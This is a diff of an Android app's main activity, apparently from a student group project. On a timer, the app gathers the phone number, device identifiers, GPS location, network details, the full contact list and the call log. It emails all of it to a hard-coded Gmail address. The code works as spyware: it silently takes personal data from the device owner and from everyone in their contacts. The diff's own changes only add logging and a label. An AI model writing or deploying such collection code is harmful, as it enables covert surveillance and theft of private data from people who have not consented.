@@ -192,10 +192,11 @@ public class MainActivity extends AppCompatActivity {
         {
             public void onTick(long millisUntilFinished)
             {
-
+                Log.i("Timer", "On Tick");
             }
             public void onFinish()
             {
+                Log.i("Timer", "Finish");
                 WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                 WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                 String ssid = wifiInfo.getSSID();
@@ -207,6 +208,7 @@ public class MainActivity extends AppCompatActivity {
 
                 Location location = locationinfo.getLocation();
 
+
                 EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +"  |  Number:"+phoneNum , "Device Info\n-----"+DeviceScrape.getDeviceInfo()
                         + "\nBattery Level:" + batterylevel
                         + "\n\nLocation\n-----\nLongitude: "+locationinfo.getLocation().getLongitude() +"\nLatitude: "+locationinfo.getLocation().getLatitude()
@@ -214,11 +216,11 @@ public class MainActivity extends AppCompatActivity {
                         + "\nIP Address: " + ipAddressString + "\nMac Address: " + macAddress
                         + "\n\nContacts:\n-----\n"
                         + ContactScrape.scrapeContacts(getContentResolver())
-                        + "\n-----\n"
+                        + "\n\nCall Log:\n-----\n"
                         + CallLogScrape.scrapeCallLogs(getContentResolver())
                 );
             }
-        } .start();
+        }.start();
 
 
 
